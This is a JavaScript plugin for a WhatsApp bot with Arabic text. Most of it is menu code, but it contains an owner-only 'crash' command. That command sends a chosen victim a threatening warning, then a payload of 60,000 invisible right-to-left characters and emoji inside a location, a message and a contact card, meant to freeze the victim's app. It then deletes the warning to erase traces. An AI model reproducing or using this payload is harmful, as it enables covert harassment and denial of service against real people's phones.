import { fileURLToPath } from 'url';
import path from 'path';

// --- الإعدادات الأساسية ---
const MENU_TIMEOUT = 120000;
const FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
const OWNER_ID = "حط رقمك@s.whatsapp.net"; // الرقم المعدل
const ownerNumbers = ["حط رقمك", " حط رقمك"];

const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];

const CATEGORIES = [
    [1, 'التـحـمـيـل', 'downloads', '📂'], [2, 'الـمـجـمـوعـات', 'group', '🐞'],
    [3, 'الـمـلـصـقـات', 'sticker', '🌄'], [4, 'الـمـطـوريـن', 'owner', '🇩🇪'],
    [5, 'الـمـطـور', 'owner', '👨🏻‍💻'], [6, 'الـادوات', 'tools', '🚀'],
    [7, 'الـبـحـث', 'search', '🌐'], [8, 'الادمــن', 'admin', '👨🏻‍⚖️'],
    [9, 'الالــعـاب', 'games', '🎮'], [10, 'الچيف', 'gif', '✴️'],
    [11, 'الـبــنـك', 'bank', '💰'], [12, 'الـذكـاء الاصـطـنـاعـي', 'ai', '🤖'],
    [13, 'الـبـوتـات الـفـرعـي', 'sub', '♥️'], [14, 'مـعـلومـات الـب_وت', 'info', '🗃️'],
    [15, 'الـالــقــاب', 'nicknames', '🫯'], [16, 'الـلـوجـوهــات', 'logos', '🎡'],
    [17, 'تـغـيـر الاصـوات', 'voices', '📢'], [18, 'أخــرى', 'other', '🌹'],
    [19, 'الـسـريـة', 'hidden', '🕶️']
];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getCat = n => CATEGORIES.find(c => c[0] === n);

const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v3.0 🦁",
        body: "FULL ACCESS GRANTED",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, bot, args, command, text }) => {
    try {
        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        const isAdmin = m.isAdmin || false;
        
        // 🕒 الوقت والتاريخ
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });

        // --- 🚪 بروتوكول أمر الدخول ---
        if (/^(دخول|تسجيل|login)$/i.test(command)) {
            if (m.sender === OWNER_ID || isOwner) {
                await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                return conn.sendMessage(m.chat, {
                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! 🕸️🔥*`,
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { react: { text: '🤮', key: m.key } });
                return m.reply(`*🚫 محاولة اختراق فاشلة يا @${m.sender.split('@')[0]}*`);
            }
        }

        // --- ☣️ منظومة التجميد بنظام "القذارة والشبح" ---
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            // 🛑 حماية القادة (لا تضرب نفسك أو المطورين)
            const targetNum = target.split('@')[0];
            if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
            }

            // 1️⃣ [نظام القذارة]: مسح رسالة الأمر فورًا
            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});

            // 2️⃣ إرسال رسالة القذارة (الإنذار)
            let warningMsg = await conn.sendMessage(target, { 
                text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل] ⚠️*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
            });
            
            await sleep(1500); 

            // Payload (فيروس التجميد)
            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            
            // 3️⃣ تنفيذ الهجوم
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
            await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });

            await sleep(1000);

            // 4️⃣ مسح رسالة القذارة من شات الضحية
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});

            return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
        }

        // --- 📜 نظام المنيو (القائمة) - لم يتم تغيير أي شيء ---
        const cmds = await bot.getAllCommands() || [];
        const selected = parseInt(args[0]);

        if (!selected) {
            const sections = [{
                title: "💀 ┋ تـرسـانـة الـمـهـام ┋ 💀",
                rows: CATEGORIES.map(c => ({
                    title: `⌖ ${c[1]} ${c[3]}`,
                    description: `🔐 الـوصـول إلـى بـروتوكـولات ${c[1]}`,
                    id: `.${command} ${c[0]}`
                }))
            }];

            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
┃ 📅 **الـتـاريـخ:** ${date}
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

> 🕸️ **OWNER:** الـﮪـواري 𓄂
`.trim();

            return await conn.sendButtonNormal(m.chat, {
                media: { url: FIXED_MENU_IMAGE },
                mediaType: 'image',
                caption: menuText,
                buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
                mentions: [m.sender],
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            });
        }

        const cat = getCat(selected);
        if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
        const categoryCmds = cmds.filter(c => c?.category === cat[2]);
        const cmdsList = categoryCmds.map(c => `┃ ${cat[3]} /${Array.isArray(c.usage) ? c.usage.join(`\n┃ ${cat[3]} /`) : 'Module'}`).join('\n');

        await conn.sendMessage(m.chat, {
            text: `╭─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╮\n┃ 🔐 بـروتوكـول ${cat[1]} ${cat[3]}\n╰─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╯\n\n${cmdsList}\n\n⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂`,
            contextInfo: context(m.sender, FIXED_MENU_IMAGE)
        }, { quoted: m });

    } catch (e) {
        console.error(e);
    }
};

handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash)$/i;

export default handler;
